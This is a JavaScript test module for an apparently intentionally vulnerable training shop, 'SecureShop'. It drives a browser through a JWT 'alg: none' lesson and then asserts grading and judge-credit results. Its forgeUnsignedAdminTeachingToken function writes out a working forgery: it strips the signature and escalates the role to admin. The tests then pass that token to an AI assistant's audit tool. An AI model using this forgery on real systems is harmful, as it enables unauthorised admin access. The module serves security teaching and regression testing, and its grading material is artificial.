'use strict';

const assert = require('node:assert/strict');
const {createHash} = require('node:crypto');
const UUID = /^[a-f0-9]{8}-[a-f0-9]{4}-[1-5][a-f0-9]{3}-[89ab][a-f0-9]{3}-[a-f0-9]{12}$/i;
const SHA = /^[a-f0-9]{64}$/;
const OBJECTIVE = 'ss_auth_bypass_jwt_none';
const RUBRIC = 'secureshop-checkout-audit-jwt-v1';
const SCOPE = 'current-main rendered customer checkout-audit JWT-none lesson with owned checkout, genuine model graph effect, canonical Judge credit, fixed no-read contrast, recovery, sibling and reset fences';
const FLAGS = Object.freeze(['passed','isolatedStores','canonicalObjectiveEnabled',
  'fixtureLocalCandidateAdmission',
  'storefrontCustomerLogin','renderedApprovedCheckout','ownedCheckoutAuditEvent',
  'renderedPracticeToken','physicalUnsignedAdminEdit','actualModelSelectedAuditProbe',
  'ownedGraphAuditRead','renderedExactAuditReport','savedGetNoReplay',
  'canonicalJudgeCredit','durableProgress','assessmentGetNoReplay','siblingPrivate',
  'resetFenced','immutableHistoryRetained','fixedModelSelectedProbe','fixedRenderedDenial',
  'fixedNoProtectedRead','fixedNoJudgeOrCredit','fixtureCleaned']);
const exact=(value,keys)=>value&&Object.getPrototypeOf(value)===Object.prototype
  &&Object.keys(value).sort().join(',')===[...keys].sort().join(',');
const decode=value=>{
  assert.match(value,/^[A-Za-z0-9_-]+$/);const bytes=Buffer.from(value,'base64url');
  assert.equal(bytes.toString('base64url'),value);assert.ok(bytes.length<=2048);
  const text=new TextDecoder('utf-8',{fatal:true}).decode(bytes),result=JSON.parse(text);
  assert.equal(JSON.stringify(result),text);assert.ok(exact(result,Object.keys(result)));return result;
};
const encode=value=>Buffer.from(JSON.stringify(value)).toString('base64url');

function forgeUnsignedAdminTeachingToken(token,{orderId}={}){
  assert.equal(typeof token,'string');assert.ok(Buffer.byteLength(token,'utf8')<=4096);
  const parts=token.split('.');assert.equal(parts.length,3);assert.match(parts[2],/^[A-Za-z0-9_-]+$/);
  const header=decode(parts[0]),payload=decode(parts[1]);
  assert.deepEqual(header,{typ:'JWT',alg:'HS256'});
  assert.deepEqual(Object.keys(payload),['iss','aud','sub','role','orderId','bindingTag']);
  assert.equal(payload.iss,'owasp-ai-goat-secureshop-v01-practice');
  assert.equal(payload.aud,'owned-checkout-audit-read');assert.match(payload.sub,/^shop-user:[1-9]\d*$/);
  assert.equal(payload.role,'customer');assert.equal(payload.orderId,orderId);
  assert.match(payload.bindingTag,/^[A-Za-z0-9_-]{43}$/);
  const forged=`${encode({typ:'JWT',alg:'none'})}.${encode({...payload,role:'admin'})}.`;
  assert.ok(Buffer.byteLength(forged,'utf8')<=4096);return forged;
}

function assertAssessment(value,{completed,evaluationId}={}){
  if(!completed){assert.ok(exact(value,['completed','status','modelEvaluated']));
    assert.equal(value.completed,false);assert.ok(['ineligible','unconfirmed'].includes(value.status));
    assert.equal(value.modelEvaluated,false);return value;}
  assert.ok(exact(value,['completed','judgment','replayed']));assert.equal(value.completed,true);
  assert.ok(exact(value.judgment,['verdict','evaluationId','canRetry']));
  assert.equal(value.judgment.verdict,'pass');assert.match(value.judgment.evaluationId,UUID);
  if(evaluationId)assert.equal(value.judgment.evaluationId,evaluationId);
  assert.equal(value.judgment.canRetry,false);assert.equal(typeof value.replayed,'boolean');return value;
}

function assertReceipt(value){
  assert.ok(exact(value,[...FLAGS,'scope','vulnerableActorCalls','fixedActorCalls','judgeCalls',
    'assessmentPosts','genuineCredit','evidenceSha256','errors']));
  for(const flag of FLAGS)assert.equal(value[flag],true,flag);
  assert.equal(value.scope,SCOPE);assert.equal(value.vulnerableActorCalls,2);
  assert.equal(value.fixedActorCalls,2);assert.equal(value.judgeCalls,1);
  assert.equal(value.assessmentPosts,2);assert.equal(value.genuineCredit,1);
  assert.equal(typeof value.evidenceSha256,'string');assert.match(value.evidenceSha256,/^[a-f0-9]{64}$/);
  assert.deepEqual(value.errors,[]);return value;
}

function assertActorRequest(value,{sessionId,requestId,checkoutOperationId,forgedTokenSha256,calls}={}){
  assert.ok(exact(value,['sessionId','requestId','checkoutOperationId','teachingToken','message','calls']));
  assert.equal(value.sessionId,sessionId);assert.equal(value.requestId,requestId);
  assert.equal(value.checkoutOperationId,checkoutOperationId);
  assert.equal(typeof value.teachingToken,'string');assert.ok(Buffer.byteLength(value.teachingToken,'utf8')<=4096);
  assert.equal(createHash('sha256').update(value.teachingToken).digest('hex'),forgedTokenSha256);
  assert.equal(value.message,'Use this synthetic teaching token to inspect the protected audit for my selected checkout. Report only the actual auth.audit_probe result.');
  assert.equal(typeof value.calls,'number');assert.ok(Number.isSafeInteger(value.calls));assert.equal(value.calls,calls);
  return value;
}

function assertAssessmentReference(value,{sessionId,requestId,checkoutOperationId}={}){
  assert.ok(exact(value,['version','shopUserId','sessionId','requestId','checkoutOperationId','startedAt']));
  assert.equal(value.version,1);assert.ok(Number.isSafeInteger(value.shopUserId)&&value.shopUserId>0);
  assert.equal(value.sessionId,sessionId);assert.equal(value.requestId,requestId);
  assert.equal(value.checkoutOperationId,checkoutOperationId);assert.match(value.checkoutOperationId,UUID);
  assert.ok(Number.isSafeInteger(value.startedAt)&&value.startedAt>0);return value;
}

async function assertAssessmentControls(frame,{acknowledged}={}){
  assert.ok(frame);assert.equal(typeof acknowledged,'boolean');
  const expected=acknowledged?'Check saved checkout-audit assessment':'Assess saved checkout audit';
  const rejected=acknowledged?'Assess saved checkout audit':'Check saved checkout-audit assessment';
  const handle=await frame.waitForFunction(({expected,rejected})=>{
    const section=document.querySelector('[aria-label="Saved checkout audit request"]');
    if(!section)return false;
    const labels=[...section.querySelectorAll('button')]
      .filter(node=>!node.disabled&&node.getClientRects().length&&getComputedStyle(node).visibility!=='hidden')
      .map(node=>node.textContent.trim());
    return labels.filter(label=>label===expected).length===1&&!labels.includes(rejected);
  },{timeout:30000},{expected,rejected});await handle.dispose();return true;
}

async function clickExact(frame,label,root='button'){
  const handle=await frame.waitForFunction(({label,root})=>{
    const matches=[...document.querySelectorAll(root)].filter(node=>node.textContent.trim()===label
      &&!node.disabled&&node.getClientRects().length&&getComputedStyle(node).visibility!=='hidden');
    return matches.length===1?matches[0]:null;
  },{timeout:30000},{label,root});
  try{const node=handle.asElement();assert.ok(node);await node.evaluate(value=>value.scrollIntoView({block:'center'}));await node.click();}
  finally{await handle.dispose();}
}
async function replacePhysically(page,element,value){
  const current=await element.evaluate(node=>typeof node?.value==='string'?node.value:null);
  assert.equal(typeof current,'string');assert.ok(current.length<=4096);
  await element.click();
  for(let index=0;index<=current.length;index++)await page.keyboard.press('ArrowRight');
  for(let index=0;index<=current.length;index++)await page.keyboard.press('Backspace');
  assert.equal(await element.evaluate(node=>node.value),'');
  await page.keyboard.type(value);assert.equal(await element.evaluate(node=>node.value),value);
}
async function readJson(response){
  assert.equal(response.status(),200);assert.match(response.headers()['content-type']||'',/^application\/json(?:;|$)/i);
  const text=await response.text();assert.ok(Buffer.byteLength(text,'utf8')<=65536);return JSON.parse(text);
}

async function runRenderedVulnerable({page,frame,origin,order,operationId,beforeCounters,afterCounters}={}){
  assert.ok(page&&frame);assert.match(origin,/^http:\/\/127\.0\.0\.1:[1-9]\d{0,4}$/);
  assert.ok(Number.isSafeInteger(order?.id)&&order.id>0&&Number.isFinite(order.total));assert.match(operationId,UUID);
  await frame.waitForSelector('[data-testid="agent-lane"] select',{visible:true});
  await frame.select('[data-testid="agent-lane"] select','checkout-audit-lesson');
  await frame.waitForSelector('[aria-label="Checkout audit teaching-token lesson"]',{visible:true});
  const receiptGet=page.waitForResponse(response=>response.request().method()==='GET'
    &&new URL(response.url()).pathname===`/api/secureshop/orders/operations/${operationId}`,{timeout:30000});
  const tokenPost=page.waitForResponse(response=>response.request().method()==='POST'
    &&new URL(response.url()).pathname==='/api/secureshop/agents/customer/checkout-audit/practice-token',{timeout:30000});
  const card=await frame.waitForFunction(({id,operationId})=>[...document.querySelectorAll('.ss-card')].find(node=>
    node.textContent.includes(`Order #${id}`)&&node.textContent.includes(operationId)
    &&[...node.querySelectorAll('button')].some(button=>button.textContent.trim()==='Get synthetic teaching token')),
  {timeout:30000},{id:order.id,operationId});
  try{const cardNode=card.asElement();assert.ok(cardNode);
    const button=await cardNode.$('button');assert.ok(button);
    assert.equal(await button.evaluate(node=>node.textContent.trim()),'Get synthetic teaching token');
    await button.evaluate(node=>node.scrollIntoView({block:'center'}));await button.click();}
  finally{await card.dispose();}
  const receiptResponse=await receiptGet;
  assert.equal(receiptResponse.status(),200);
  assert.match(receiptResponse.headers()['content-type']||'',/^application\/json(?:;|$)/i);
  const prepared=await readJson(await tokenPost);assert.equal(prepared.orderId,order.id);
  assert.equal(prepared.operationId,operationId);assert.equal(prepared.modeCapability?.effectiveMode,'vuln');
  const textarea=await frame.waitForSelector('#checkout-audit-teaching-token',{visible:true});
  assert.equal(await textarea.evaluate(node=>node.value),prepared.token);
  const forged=forgeUnsignedAdminTeachingToken(prepared.token,{orderId:order.id});
  await replacePhysically(page,textarea,forged);
  const post=page.waitForRequest(request=>request.method()==='POST'
    &&new URL(request.url()).pathname==='/api/secureshop/agents/customer/checkout-audit/chat',{timeout:30000});
  await clickExact(frame,'Ask assistant to inspect checkout audit');const request=await post;
  const body=JSON.parse(request.postData());
  assert.ok(exact(body,['sessionId','requestId','checkoutOperationId','teachingToken','message']));
  assert.match(body.sessionId,UUID);assert.match(body.requestId,UUID);
  assert.equal(body.checkoutOperationId,operationId);assert.equal(body.teachingToken,forged);
  assert.equal(body.message,'Use this synthetic teaching token to inspect the protected audit for my selected checkout. Report only the actual auth.audit_probe result.');
  const terminal=await frame.waitForFunction(({id,total})=>{
    const section=document.querySelector('[aria-label="Saved checkout audit request"]');
    if(!section)return null;const text=section.textContent;
    if(text.includes(`Protected audit read observed for Order #${id} · $${Number(total).toFixed(2)}.`))
      return {status:'disclosed',text:text.slice(0,2048)};
    if(text.includes('The practice verifier denied the supplied synthetic token.'))
      return {status:'denied',text:text.slice(0,2048)};
    if(text.includes('The assistant completed without using the audit tool.'))
      return {status:'no_effect',text:text.slice(0,2048)};
    return null;
  },{timeout:150000},{id:order.id,total:order.total});
  const terminalValue=await terminal.jsonValue();await terminal.dispose();
  if(terminalValue.status!=='disclosed'){
    const pathname=`/api/secureshop/agents/customer/checkout-audit/operations/${body.sessionId}/${body.requestId}`;
    const persistedGet=page.waitForResponse(response=>response.request().method()==='GET'
      &&new URL(response.url()).pathname===pathname,{timeout:30000});
    await clickExact(frame,'Check saved request');
    const persisted=await readJson(await persistedGet);
    assert.ok(exact(persisted,['sessionId','requestId','status','text','result','checkoutOperationId','modeCapability']));
    assert.equal(persisted.sessionId,body.sessionId);assert.equal(persisted.requestId,body.requestId);
    assert.equal(persisted.status,'completed');assert.equal(persisted.checkoutOperationId,operationId);
    assert.equal(persisted.result?.status??'no_effect',terminalValue.status);
    throw Object.assign(new Error(`V01 saved outcome ${terminalValue.status}: ${terminalValue.text}`),
      {code:'V01_SAVED_OUTCOME_NOT_DISCLOSED',persistedStatus:persisted.result?.status??'no_effect'});
  }
  const exactReport=await frame.$eval('[aria-label="Saved checkout audit request"]',node=>node.textContent);
  assert.ok(exactReport.includes(`Protected audit read observed for Order #${order.id} · $${Number(order.total).toFixed(2)}.`));
  if(beforeCounters&&afterCounters){const before=await beforeCounters(),after=await afterCounters();
    assert.equal(after.actor-before.actor,2);assert.equal(after.effects-before.effects,1);}
  return Object.freeze({sessionId:body.sessionId,requestId:body.requestId,operationId,order,
    forgedTokenSha256:createHash('sha256').update(forged).digest('hex'),exactReport});
}


async function runCanonicalAssessment({page,frame,sessionId,requestId,operationId,readAssessmentReference}={}){
  assert.ok(page&&frame);assert.match(sessionId,UUID);assert.match(requestId,UUID);assert.match(operationId,UUID);
  assert.equal(typeof readAssessmentReference,'function');assert.equal(await readAssessmentReference(),null);
  await assertAssessmentControls(frame,{acknowledged:false});
  const pathname='/api/secureshop/agents/customer/checkout-audit/assess';
  const requested=page.waitForRequest(request=>request.method()==='POST'
    &&new URL(request.url()).pathname===pathname,{timeout:150000});
  const pending=page.waitForResponse(response=>response.request().method()==='POST'
    &&new URL(response.url()).pathname===pathname,{timeout:150000});
  await clickExact(frame,'Assess saved checkout audit');
  const request=await requested,body=JSON.parse(request.postData());
  assert.ok(exact(body,['sessionId','requestId']));assert.deepEqual(body,{sessionId,requestId});
  assertAssessmentReference(await readAssessmentReference(),{sessionId,requestId,checkoutOperationId:operationId});
  const response=await pending;
  const result=assertAssessment(await readJson(response),{completed:true});
  assertAssessmentReference(await readAssessmentReference(),{sessionId,requestId,checkoutOperationId:operationId});
  await assertAssessmentControls(frame,{acknowledged:true});
  await frame.waitForFunction(()=>document.querySelector('[aria-label="Saved checkout audit request"]')
    ?.textContent.includes('Objective completed in canonical progress.'),{timeout:30000});
  return result;
}
async function readCanonicalAssessment({page,sessionId,requestId,evaluationId}={}){
  assert.ok(page);assert.match(sessionId,UUID);assert.match(requestId,UUID);
  const pathname=`/api/secureshop/agents/customer/checkout-audit/assess/${sessionId}/${requestId}`;
  const response=await page.evaluate(async pathname=>{const result=await fetch(pathname,{headers:{accept:'application/json'}});
    return {status:result.status,contentType:result.headers.get('content-type'),text:await result.text()};},pathname);
  assert.equal(response.status,200);assert.match(response.contentType||'',/^application\/json(?:;|$)/i);
  assert.ok(Buffer.byteLength(response.text,'utf8')<=65536);
  return assertAssessment(JSON.parse(response.text),{completed:true,evaluationId});
}

async function readCanonicalAssessmentPhysically({page,frame,sessionId,requestId,evaluationId}={}){
  assert.ok(page&&frame);const pathname=`/api/secureshop/agents/customer/checkout-audit/assess/${sessionId}/${requestId}`;
  const pending=page.waitForResponse(response=>response.request().method()==='GET'
    &&new URL(response.url()).pathname===pathname,{timeout:30000});
  await clickExact(frame,'Check saved checkout-audit assessment');
  return assertAssessment(await readJson(await pending),{completed:true,evaluationId});
}

async function assertRenderedFixed({page,frame,order}={}){
  await frame.waitForFunction(id=>document.querySelector('[aria-label="Saved checkout audit request"]')
    ?.textContent.includes('Fixed-mode policy denied the protected audit read.'),{timeout:150000},order.id);
  assert.ok((await frame.$eval('[aria-label="Saved checkout audit request"]',node=>node.textContent))
    .includes('Fixed-mode policy denied the protected audit read.'));
}

async function runRenderedFixed({page,frame,order,operationId}={}){
  assert.ok(page&&frame);assert.ok(Number.isSafeInteger(order?.id)&&order.id>0);assert.match(operationId,UUID);
  await frame.select('[data-testid="agent-lane"] select','checkout-audit-lesson');
  const receiptGet=page.waitForResponse(response=>response.request().method()==='GET'
    &&new URL(response.url()).pathname===`/api/secureshop/orders/operations/${operationId}`,{timeout:30000});
  const tokenPost=page.waitForResponse(response=>response.request().method()==='POST'
    &&new URL(response.url()).pathname==='/api/secureshop/agents/customer/checkout-audit/practice-token',{timeout:30000});
  const card=await frame.waitForFunction(({id,operationId})=>[...document.querySelectorAll('.ss-card')].find(node=>
    node.textContent.includes(`Order #${id}`)&&node.textContent.includes(operationId)
    &&[...node.querySelectorAll('button')].some(button=>button.textContent.trim()==='Get synthetic teaching token')),
  {timeout:30000},{id:order.id,operationId});
  try{const node=card.asElement();assert.ok(node);const button=await node.$('button');assert.ok(button);await button.click();}
  finally{await card.dispose();}
  const receiptResponse=await receiptGet;
  assert.equal(receiptResponse.status(),200);
  assert.match(receiptResponse.headers()['content-type']||'',/^application\/json(?:;|$)/i);
  const prepared=await readJson(await tokenPost);assert.equal(prepared.modeCapability?.effectiveMode,'fixed');
  const textarea=await frame.waitForSelector('#checkout-audit-teaching-token',{visible:true});
  const forged=forgeUnsignedAdminTeachingToken(prepared.token,{orderId:order.id});await replacePhysically(page,textarea,forged);
  const pending=page.waitForRequest(request=>request.method()==='POST'
    &&new URL(request.url()).pathname==='/api/secureshop/agents/customer/checkout-audit/chat',{timeout:30000});
  await clickExact(frame,'Ask assistant to inspect checkout audit');const body=JSON.parse((await pending).postData());
  assert.ok(exact(body,['sessionId','requestId','checkoutOperationId','teachingToken','message']));
  assert.equal(body.checkoutOperationId,operationId);assert.equal(body.teachingToken,forged);
  await assertRenderedFixed({page,frame,order});return Object.freeze({sessionId:body.sessionId,requestId:body.requestId,
    operationId,forgedTokenSha256:createHash('sha256').update(forged).digest('hex')});
}

async function runFixedAssessment({page,frame,sessionId,requestId,operationId,readAssessmentReference}={}){
  assert.ok(page&&frame);assert.match(sessionId,UUID);assert.match(requestId,UUID);assert.match(operationId,UUID);
  assert.equal(typeof readAssessmentReference,'function');assert.equal(await readAssessmentReference(),null);
  await assertAssessmentControls(frame,{acknowledged:false});
  const pathname='/api/secureshop/agents/customer/checkout-audit/assess';
  const requested=page.waitForRequest(request=>request.method()==='POST'
    &&new URL(request.url()).pathname===pathname,{timeout:30000});
  const pending=page.waitForResponse(response=>response.request().method()==='POST'
    &&new URL(response.url()).pathname===pathname,{timeout:30000});
  await clickExact(frame,'Assess saved checkout audit');
  const request=await requested,body=JSON.parse(request.postData());
  assert.deepEqual(body,{sessionId,requestId});
  assertAssessmentReference(await readAssessmentReference(),{sessionId,requestId,checkoutOperationId:operationId});
  const response=await pending;
  const result=assertAssessment(await readJson(response),{completed:false});
  assertAssessmentReference(await readAssessmentReference(),{sessionId,requestId,checkoutOperationId:operationId});
  await assertAssessmentControls(frame,{acknowledged:true});return result;
}

module.exports={V01_BROWSER_OBJECTIVE:OBJECTIVE,V01_BROWSER_RUBRIC:RUBRIC,
  V01_BROWSER_SCOPE:SCOPE,V01_BROWSER_FLAGS:FLAGS,forgeUnsignedAdminTeachingToken,
  assertV01BrowserAssessment:assertAssessment,assertV01BrowserReceipt:assertReceipt,
  assertV01ActorRequest:assertActorRequest,assertV01AssessmentReference:assertAssessmentReference,
  runV01RenderedVulnerable:runRenderedVulnerable,runV01CanonicalAssessment:runCanonicalAssessment,
  readV01CanonicalAssessment:readCanonicalAssessment,
  readV01CanonicalAssessmentPhysically:readCanonicalAssessmentPhysically,
  assertV01RenderedFixed:assertRenderedFixed,
  runV01RenderedFixed:runRenderedFixed,
  runV01FixedAssessment:runFixedAssessment};
